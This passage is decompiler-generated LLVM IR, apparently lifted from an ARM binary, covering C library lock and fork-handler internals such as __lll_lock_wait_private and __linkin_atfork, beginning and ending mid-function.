  %v1_10610 = load i32, i32* %r7.global-to-local, align 4
  %v2_10610 = add i32 %v1_10610, 8
  %v3_10610 = inttoptr i32 %v2_10610 to i32*
  store i32 %v0_10610, i32* %v3_10610, align 4
  br label %dec_label_pc_10734

dec_label_pc_10734:                               ; preds = %bb74, %dec_label_pc_105b8
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_10618 = load i32, i32* %r8.global-to-local, align 4
  %v2_10618 = add i32 %v0_10618, 160
  %v3_10618 = inttoptr i32 %v2_10618 to i32*
  %v4_10618 = load i32, i32* %v3_10618, align 4
  store i32 %v4_10618, i32* %r2.global-to-local, align 4
  %v1_1061c = add i32 %v4_10618, 4
  %v2_1061c = inttoptr i32 %v1_1061c to i32*
  %v3_1061c = load i32, i32* %v2_1061c, align 4
  %v1_10620 = add i32 %v3_1061c, 1
  store i32 %v1_10620, i32* %r3.global-to-local, align 4
  store i32 %v1_10620, i32* %v2_1061c, align 4
  %v0_10628 = load i32, i32* %r5.global-to-local, align 4
  %v1_10628 = add i32 %v0_10628, 108
  %v2_10628 = inttoptr i32 %v1_10628 to i32*
  %v3_10628 = load i32, i32* %v2_10628, align 4
  store i32 %v3_10628, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_10630 = sub i32 0, %v3_10628
  store i32 %v1_10630, i32* %v2_10628, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_10644 = load i32, i32* %r5.global-to-local, align 4
  %v1_10644 = add i32 %v0_10644, 104
  store i32 %v1_10644, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_10738.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_10738 = add i32 %v0_10644, 108
  %v3_10738 = inttoptr i32 %v2_10738 to i32*
  store i32 %v0_10738.pre, i32* %v3_10738, align 4
  %v0_1073c = load i32, i32* %r8.global-to-local, align 4
  %v1_1073c = load i32, i32* %r3.global-to-local, align 4
  %v2_1073c = add i32 %v1_1073c, %v0_1073c
  %v3_1073c = inttoptr i32 %v2_1073c to i32*
  %v4_1073c = load i32, i32* %v3_1073c, align 4
  store i32 %v4_1073c, i32* %r0.global-to-local, align 4
  %v1_10740 = add i32 %v4_1073c, 4
  %v2_10740 = inttoptr i32 %v1_10740 to i32*
  %v3_10740 = load i32, i32* %v2_10740, align 4
  %v1_10744 = add i32 %v3_10740, -1
  store i32 %v1_10744, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10748 = icmp eq i32 %v1_10744, 0
  store i32 %v1_10744, i32* %v2_10740, align 4
  br i1 %v2_10748, label %dec_label_pc_10754, label %dec_label_pc_10844thread-pre-split

dec_label_pc_10754:                               ; preds = %dec_label_pc_10734
  %v0_10754 = load i32, i32* %r3.global-to-local, align 4
  %v1_10754 = load i32, i32* %r0.global-to-local, align 4
  %v2_10754 = add i32 %v1_10754, 8
  %v3_10754 = inttoptr i32 %v2_10754 to i32*
  store i32 %v0_10754, i32* %v3_10754, align 4
  %v0_10758 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10758, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1075c

dec_label_pc_1075c:                               ; preds = %dec_label_pc_1078c.dec_label_pc_1075c_crit_edge, %dec_label_pc_10754
  %v0_1075c = phi i32 [ %v0_1075c.pre, %dec_label_pc_1078c.dec_label_pc_1075c_crit_edge ], [ %v0_10758, %dec_label_pc_10754 ]
  %v1_1075c = inttoptr i32 %v0_1075c to i32*
  %v2_1075c = load i32, i32* %v1_1075c, align 4
  store i32 %v2_1075c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1075c, i32* %r2.global-to-local, align 4
  %v2_10768100 = load i32, i32* %v1_1075c, align 4
  store i32 %v2_10768100, i32* %r3.global-to-local, align 4
  %v3_1076c102 = icmp uge i32 %v2_10768100, %v2_1075c
  store i1 %v3_1076c102, i1* %cpsr_c.global-to-local, align 1
  %v9_1076c108 = icmp eq i32 %v2_10768100, %v2_1075c
  br i1 %v9_1076c108, label %dec_label_pc_10774, label %dec_label_pc_1078c

dec_label_pc_10774:                               ; preds = %dec_label_pc_1075c, %dec_label_pc_10774.dec_label_pc_10768_crit_edge
  %v0_10774109 = phi i32 [ %v1_1076c.pre, %dec_label_pc_10774.dec_label_pc_10768_crit_edge ], [ %v2_1075c, %dec_label_pc_1075c ]
  store i32 %v0_10774109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10784 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10784, label %dec_label_pc_10788, label %dec_label_pc_10774.dec_label_pc_10768_crit_edge

dec_label_pc_10774.dec_label_pc_10768_crit_edge:  ; preds = %dec_label_pc_10774
  %v0_10768.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1076c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10768 = inttoptr i32 %v0_10768.pre to i32*
  %v2_10768 = load i32, i32* %v1_10768, align 4
  store i32 %v2_10768, i32* %r3.global-to-local, align 4
  %v3_1076c = icmp uge i32 %v2_10768, %v1_1076c.pre
  store i1 %v3_1076c, i1* %cpsr_c.global-to-local, align 1
  %v9_1076c = icmp eq i32 %v2_10768, %v1_1076c.pre
  br i1 %v9_1076c, label %dec_label_pc_10774, label %dec_label_pc_1078c

dec_label_pc_10788:                               ; preds = %dec_label_pc_10774
  %v0_10788 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10788, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1078c

dec_label_pc_1078c:                               ; preds = %dec_label_pc_1075c, %dec_label_pc_10774.dec_label_pc_10768_crit_edge, %dec_label_pc_10788
  %v0_10794 = phi i32 [ %v0_10788, %dec_label_pc_10788 ], [ %v2_10768100, %dec_label_pc_1075c ], [ %v2_10768, %dec_label_pc_10774.dec_label_pc_10768_crit_edge ]
  %v1_1078c = phi i32 [ %v0_10788, %dec_label_pc_10788 ], [ %v2_1075c, %dec_label_pc_1075c ], [ %v1_1076c.pre, %dec_label_pc_10774.dec_label_pc_10768_crit_edge ]
  %v3_1078c = icmp uge i32 %v0_10794, %v1_1078c
  store i1 %v3_1078c, i1* %cpsr_c.global-to-local, align 1
  %v9_1078c = icmp eq i32 %v0_10794, %v1_1078c
  br i1 %v9_1078c, label %dec_label_pc_10794, label %dec_label_pc_1078c.dec_label_pc_1075c_crit_edge

dec_label_pc_1078c.dec_label_pc_1075c_crit_edge:  ; preds = %dec_label_pc_1078c
  %v0_1075c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1075c

dec_label_pc_10794:                               ; preds = %dec_label_pc_1078c
  %v2_10794 = icmp ne i32 %v1_1078c, 0
  store i1 %v2_10794, i1* %cpsr_c.global-to-local, align 1
  %v7_10798 = icmp slt i32 %v1_1078c, 2
  br i1 %v7_10798, label %dec_label_pc_10844thread-pre-split, label %dec_label_pc_1079c

dec_label_pc_1079c:                               ; preds = %dec_label_pc_10794
  %v0_1079c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1079c, i32* %r0.global-to-local, align 4
  %v0_107a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_107a0 = add i32 %v0_107a0, 129
  store i32 %v1_107a0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10844thread-pre-split

dec_label_pc_107b8:                               ; preds = %dec_label_pc_10844thread-pre-split, %dec_label_pc_10840
  %v0_107b8 = phi i32 [ %v3_10840, %dec_label_pc_10840 ], [ %v0_10844.pr, %dec_label_pc_10844thread-pre-split ]
  %v1_107b8 = inttoptr i32 %v0_107b8 to i32*
  %v2_107b8 = load i32, i32* %v1_107b8, align 4
  store i32 %v2_107b8, i32* %r3.global-to-local, align 4
  %v1_107bc = add i32 %v2_107b8, 8
  %v2_107bc = inttoptr i32 %v1_107bc to i32*
  %v3_107bc = load i32, i32* %v2_107bc, align 4
  store i32 %v3_107bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107c0 = icmp eq i32 %v3_107bc, 0
  br i1 %v2_107c0, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_107b8
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_107b8, %bb75
  %v2_107c8 = xor i1 %v2_107c0, true
  call void @__pseudo_cond_branch(i1 %v2_107c8, i32 %v3_107bc)
  %v0_107cc = load i32, i32* %r6.global-to-local, align 4
  %v1_107cc = inttoptr i32 %v0_107cc to i32*
  %v2_107cc = load i32, i32* %v1_107cc, align 4
  store i32 %v2_107cc, i32* %r5.global-to-local, align 4
  %v1_107d0 = add i32 %v2_107cc, 20
  store i32 %v1_107d0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %dec_label_pc_10808.dec_label_pc_107d4_crit_edge, %bb76
  %v0_107d8 = phi i32 [ %v0_107d8.pre, %dec_label_pc_10808.dec_label_pc_107d4_crit_edge ], [ %v1_107d0, %bb76 ]
  %v0_107d4 = phi i32 [ %v0_107d4.pre, %dec_label_pc_10808.dec_label_pc_107d4_crit_edge ], [ %v2_107cc, %bb76 ]
  %v1_107d4 = add i32 %v0_107d4, 20
  %v2_107d4 = inttoptr i32 %v1_107d4 to i32*
  %v3_107d4 = load i32, i32* %v2_107d4, align 4
  store i32 %v0_107d8, i32* %r2.global-to-local, align 4
  store i32 %v3_107d4, i32* %r4.global-to-local, align 4
  %v1_107e0 = add i32 %v3_107d4, -1
  store i32 %v1_107e0, i32* %r1.global-to-local, align 4
  %v1_107e487 = inttoptr i32 %v0_107d8 to i32*
  %v2_107e488 = load i32, i32* %v1_107e487, align 4
  store i32 %v2_107e488, i32* %r3.global-to-local, align 4
  %v3_107e890 = icmp uge i32 %v2_107e488, %v3_107d4
  store i1 %v3_107e890, i1* %cpsr_c.global-to-local, align 1
  %v9_107e896 = icmp eq i32 %v2_107e488, %v3_107d4
  br i1 %v9_107e896, label %dec_label_pc_107f0, label %dec_label_pc_10808

dec_label_pc_107f0:                               ; preds = %dec_label_pc_107d4, %dec_label_pc_107f0.dec_label_pc_107e4_crit_edge
  %v0_107f097 = phi i32 [ %v1_107e8.pre, %dec_label_pc_107f0.dec_label_pc_107e4_crit_edge ], [ %v3_107d4, %dec_label_pc_107d4 ]
  store i32 %v0_107f097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10800 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10800, label %dec_label_pc_10804, label %dec_label_pc_107f0.dec_label_pc_107e4_crit_edge

dec_label_pc_107f0.dec_label_pc_107e4_crit_edge:  ; preds = %dec_label_pc_107f0
  %v0_107e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_107e8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_107e4 = inttoptr i32 %v0_107e4.pre to i32*
  %v2_107e4 = load i32, i32* %v1_107e4, align 4
  store i32 %v2_107e4, i32* %r3.global-to-local, align 4
  %v3_107e8 = icmp uge i32 %v2_107e4, %v1_107e8.pre
  store i1 %v3_107e8, i1* %cpsr_c.global-to-local, align 1
  %v9_107e8 = icmp eq i32 %v2_107e4, %v1_107e8.pre
  br i1 %v9_107e8, label %dec_label_pc_107f0, label %dec_label_pc_10808

dec_label_pc_10804:                               ; preds = %dec_label_pc_107f0
  %v0_10804 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10804, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10808

dec_label_pc_10808:                               ; preds = %dec_label_pc_107d4, %dec_label_pc_107f0.dec_label_pc_107e4_crit_edge, %dec_label_pc_10804
  %v0_10814 = phi i32 [ %v0_10804, %dec_label_pc_10804 ], [ %v2_107e488, %dec_label_pc_107d4 ], [ %v2_107e4, %dec_label_pc_107f0.dec_label_pc_107e4_crit_edge ]
  %v1_10808 = phi i32 [ %v0_10804, %dec_label_pc_10804 ], [ %v3_107d4, %dec_label_pc_107d4 ], [ %v1_107e8.pre, %dec_label_pc_107f0.dec_label_pc_107e4_crit_edge ]
  %v3_10808 = icmp uge i32 %v0_10814, %v1_10808
  store i1 %v3_10808, i1* %cpsr_c.global-to-local, align 1
  %v9_10808 = icmp eq i32 %v0_10814, %v1_10808
  store i32 %v0_10814, i32* %r2.global-to-local, align 4
  br i1 %v9_10808, label %dec_label_pc_10814, label %dec_label_pc_10808.dec_label_pc_107d4_crit_edge

dec_label_pc_10808.dec_label_pc_107d4_crit_edge:  ; preds = %dec_label_pc_10808
  %v0_107d4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_107d8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_107d4

dec_label_pc_10814:                               ; preds = %dec_label_pc_10808
  %v2_10814 = icmp ne i32 %v1_10808, 0
  store i1 %v2_10814, i1* %cpsr_c.global-to-local, align 1
  %v7_10814 = icmp eq i32 %v1_10808, 1
  %v0_1081c = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_10814, label %dec_label_pc_1081c, label %dec_label_pc_10840

dec_label_pc_1081c:                               ; preds = %dec_label_pc_10814
  %v1_1081c = inttoptr i32 %v0_1081c to i32*
  %v2_1081c = load i32, i32* %v1_1081c, align 4
  store i32 %v2_1081c, i32* %r1.global-to-local, align 4
  %v1_10820 = add i32 %v2_1081c, 24
  %v2_10820 = inttoptr i32 %v1_10820 to i32*
  %v3_10820 = load i32, i32* %v2_10820, align 4
  store i32 %v3_10820, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10824 = icmp eq i32 %v3_10820, 0
  br i1 %v2_10824, label %dec_label_pc_10840, label %dec_label_pc_1082c

dec_label_pc_1082c:                               ; preds = %dec_label_pc_1081c
  %v1_1082c = add i32 %v2_1081c, 20
  %v2_1082c = inttoptr i32 %v1_1082c to i32*
  %v3_1082c = load i32, i32* %v2_1082c, align 4
  store i32 %v3_1082c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10840

dec_label_pc_10840:                               ; preds = %dec_label_pc_10814, %dec_label_pc_1082c, %dec_label_pc_1081c
  %v1_10840 = add i32 %v0_1081c, 4
  %v2_10840 = inttoptr i32 %v1_10840 to i32*
  %v3_10840 = load i32, i32* %v2_10840, align 4
  store i32 %v3_10840, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10844 = icmp eq i32 %v3_10840, 0
  br i1 %v2_10844, label %dec_label_pc_1084c, label %dec_label_pc_107b8

dec_label_pc_10844thread-pre-split:               ; preds = %dec_label_pc_1079c, %dec_label_pc_10794, %dec_label_pc_10734
  %v0_10844.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1084411 = icmp eq i32 %v0_10844.pr, 0
  br i1 %v2_1084411, label %dec_label_pc_1084c, label %dec_label_pc_107b8

dec_label_pc_1084c:                               ; preds = %dec_label_pc_10840, %dec_label_pc_10844thread-pre-split
  %v0_1084c.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1084c.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_1084c.pre

; uselistorder directives
  uselistorder i32 %v0_10844.pr, { 1, 0 }
  uselistorder i32 %v3_10840, { 1, 2, 0 }
  uselistorder i32 %v1_10808, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10804, { 1, 0, 2 }
  uselistorder i32 %v1_107e8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10788, { 1, 0, 2 }
  uselistorder i32 %v1_1076c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1075c, { 1, 0 }
  uselistorder i32 %v0_10600, { 1, 0, 2 }
  uselistorder i32 %v1_105e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_105bc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10594, { 1, 0, 2 }
  uselistorder i32 %v1_10578.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10540, { 1, 0, 2 }
  uselistorder i32 %v0_10520, { 1, 0, 2 }
  uselistorder i32 %v1_10504.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v3_104e4, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 3, 1, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 11, 12, 13, 14, 0, 2, 1, 3, 4, 5, 7, 8, 6, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 8, 9, 11, 10, 12, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 13, 12, 14, 16, 15, 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 19, 20, 21, 23, 22, 16, 24, 25, 26, 27, 29, 28, 17, 30, 31, 32, 33, 0, 1, 2, 4, 3, 15, 5, 6, 7, 9, 8, 34, 10, 11, 13, 12, 18, 14 }
  uselistorder i32* %r2.global-to-local, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 0, 1, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 2, 5, 3, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 14, 25, 19, 20, 21, 23, 22, 0, 24, 26, 27, 29, 28, 16, 30, 2, 4, 3, 1, 5, 6, 7, 31, 32, 8, 9, 10, 11, 17, 18, 13, 12, 15 }
  uselistorder label %dec_label_pc_1084c, { 1, 0 }
  uselistorder label %dec_label_pc_10840, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10808, { 2, 1, 0 }
  uselistorder label %dec_label_pc_107f0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_1078c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10774, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_10604, { 2, 1, 0 }
  uselistorder label %dec_label_pc_105ec, { 1, 0 }
  uselistorder label %dec_label_pc_10598, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10580, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_10524, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1050c, { 1, 0 }
  uselistorder label %dec_label_pc_105a8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_104d8, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10884 = load i32, i32* @r4, align 4
  store i32 %v3_10884, i32* %stack_var_-16, align 4
  %v0_10888 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10888, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1088c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_1090c.dec_label_pc_1088c_crit_edge, %entry
  %v0_10890 = phi i32 [ %v0_10890.pre, %dec_label_pc_1090c.dec_label_pc_1088c_crit_edge ], [ %v0_10888, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_10890, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1089817 = inttoptr i32 %v0_10890 to i32*
  %v2_1089818 = load i32, i32* %v1_1089817, align 4
  %v3_1089c20 = icmp ne i32 %v2_1089818, 0
  store i1 %v3_1089c20, i1* %cpsr_c.global-to-local, align 1
  %v9_1089c26 = icmp eq i32 %v2_1089818, 1
  br i1 %v9_1089c26, label %dec_label_pc_108a4, label %dec_label_pc_108bc

dec_label_pc_108a4:                               ; preds = %dec_label_pc_1088c, %dec_label_pc_108a4.dec_label_pc_10898_crit_edge
  %v0_108a427 = phi i32 [ %v1_1089c.pre, %dec_label_pc_108a4.dec_label_pc_10898_crit_edge ], [ 1, %dec_label_pc_1088c ]
  store i32 %v0_108a427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_108b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_108b4, label %dec_label_pc_108b8, label %dec_label_pc_108a4.dec_label_pc_10898_crit_edge

dec_label_pc_108a4.dec_label_pc_10898_crit_edge:  ; preds = %dec_label_pc_108a4
  %v0_10898.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1089c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10898 = inttoptr i32 %v0_10898.pre to i32*
  %v2_10898 = load i32, i32* %v1_10898, align 4
  %v3_1089c = icmp uge i32 %v2_10898, %v1_1089c.pre
  store i1 %v3_1089c, i1* %cpsr_c.global-to-local, align 1
  %v9_1089c = icmp eq i32 %v2_10898, %v1_1089c.pre
  br i1 %v9_1089c, label %dec_label_pc_108a4, label %dec_label_pc_108bc

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108a4
  %v0_108b8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_108bc

dec_label_pc_108bc:                               ; preds = %dec_label_pc_1088c, %dec_label_pc_108a4.dec_label_pc_10898_crit_edge, %dec_label_pc_108b8
  %v0_108bc = phi i32 [ %v0_108b8, %dec_label_pc_108b8 ], [ %v2_1089818, %dec_label_pc_1088c ], [ %v2_10898, %dec_label_pc_108a4.dec_label_pc_10898_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_108bc = icmp eq i32 %v0_108bc, 0
  %v0_108e0.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_108bc, label %dec_label_pc_108dc, label %dec_label_pc_108c4

dec_label_pc_108c4:                               ; preds = %dec_label_pc_108bc
  store i32 %v0_108e0.pre, i32* %r0.global-to-local, align 4
  %v0_108c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_108c8 = add i32 %v0_108c8, 126
  store i32 %v1_108c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108bc, %dec_label_pc_108c4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_108e0.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_108e828 = inttoptr i32 %v0_108e0.pre to i32*
  %v2_108e829 = load i32, i32* %v1_108e828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_108ec36 = icmp eq i32 %v2_108e829, 0
  br i1 %v9_108ec36, label %dec_label_pc_108f4, label %dec_label_pc_1090c

dec_label_pc_108f4:                               ; preds = %dec_label_pc_108dc, %dec_label_pc_108f4.dec_label_pc_108e8_crit_edge
  %v0_108f437 = phi i32 [ %v1_108ec.pre, %dec_label_pc_108f4.dec_label_pc_108e8_crit_edge ], [ 0, %dec_label_pc_108dc ]
  store i32 %v0_108f437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10904 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10904, label %dec_label_pc_10908, label %dec_label_pc_108f4.dec_label_pc_108e8_crit_edge

dec_label_pc_108f4.dec_label_pc_108e8_crit_edge:  ; preds = %dec_label_pc_108f4
  %v0_108e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_108ec.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_108e8 = inttoptr i32 %v0_108e8.pre to i32*
  %v2_108e8 = load i32, i32* %v1_108e8, align 4
  %v3_108ec = icmp uge i32 %v2_108e8, %v1_108ec.pre
  store i1 %v3_108ec, i1* %cpsr_c.global-to-local, align 1
  %v9_108ec = icmp eq i32 %v2_108e8, %v1_108ec.pre
  br i1 %v9_108ec, label %dec_label_pc_108f4, label %dec_label_pc_1090c

dec_label_pc_10908:                               ; preds = %dec_label_pc_108f4
  %v0_10908 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1090c

dec_label_pc_1090c:                               ; preds = %dec_label_pc_108dc, %dec_label_pc_108f4.dec_label_pc_108e8_crit_edge, %dec_label_pc_10908
  %v0_1090c = phi i32 [ %v0_10908, %dec_label_pc_10908 ], [ %v2_108e829, %dec_label_pc_108dc ], [ %v2_108e8, %dec_label_pc_108f4.dec_label_pc_108e8_crit_edge ]
  %v1_1090c = phi i32 [ %v0_10908, %dec_label_pc_10908 ], [ 0, %dec_label_pc_108dc ], [ %v1_108ec.pre, %dec_label_pc_108f4.dec_label_pc_108e8_crit_edge ]
  %v3_1090c = icmp uge i32 %v0_1090c, %v1_1090c
  store i1 %v3_1090c, i1* %cpsr_c.global-to-local, align 1
  %v9_1090c = icmp eq i32 %v0_1090c, %v1_1090c
  br i1 %v9_1090c, label %dec_label_pc_10914, label %dec_label_pc_1090c.dec_label_pc_1088c_crit_edge

dec_label_pc_1090c.dec_label_pc_1088c_crit_edge:  ; preds = %dec_label_pc_1090c
  %v0_10890.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1088c

dec_label_pc_10914:                               ; preds = %dec_label_pc_1090c
  %v2_10914 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10914, i32* %r4.global-to-local, align 4
  %v1_10918 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10918

; uselistorder directives
  uselistorder i32 %v0_10908, { 1, 0 }
  uselistorder i32 %v1_108ec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1089c.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1089818, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder label %dec_label_pc_1090c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_108f4, { 1, 0 }
  uselistorder label %dec_label_pc_108dc, { 1, 0 }
  uselistorder label %dec_label_pc_108bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_108a4, { 1, 0 }
}

define i32 @__linkin_atfork(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1091c = load i32, i32* @r4, align 4
  store i32 %v3_1091c, i32* %stack_var_-24, align 4
  store i32 15396, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r5.global-to-local, align 4
  %v0_1092c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1092c, i32* %r6.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15396), i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %dec_label_pc_10968.dec_label_pc_10934_crit_edge, %entry
  %v0_10938 = phi i32 [ %v0_10938.pre, %dec_label_pc_10968.dec_label_pc_10934_crit_edge ], [ %v0_1092c, %entry ]
  %v1_10934 = phi i32 [ %v1_10934.pre, %dec_label_pc_10968.dec_label_pc_10934_crit_edge ], [ 15396, %entry ]
  %v0_10934 = phi i32 [ %v0_10934.pre, %dec_label_pc_10968.dec_label_pc_10934_crit_edge ], [ ptrtoint (i32* @global_var_24010.405 to i32), %entry ]
  %v2_10934 = add i32 %v0_10934, %v1_10934
  %v3_10934 = inttoptr i32 %v2_10934 to i32*
  %v4_10934 = load i32, i32* %v3_10934, align 4
  store i32 %v4_10934, i32* %r4.global-to-local, align 4
  %v2_1093c = inttoptr i32 %v0_10938 to i32*
  store i32 %v4_10934, i32* %v2_1093c, align 4
  %v0_10940 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10940, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10944

dec_label_pc_10944:                               ; preds = %dec_label_pc_10950.dec_label_pc_10944_crit_edge, %dec_label_pc_10934
  %v0_10944 = phi i32 [ %v0_10944.pre, %dec_label_pc_10950.dec_label_pc_10944_crit_edge ], [ %v0_10940, %dec_label_pc_10934 ]
  %v1_10944 = inttoptr i32 %v0_10944 to i32*
  %v2_10944 = load i32, i32* %v1_10944, align 4
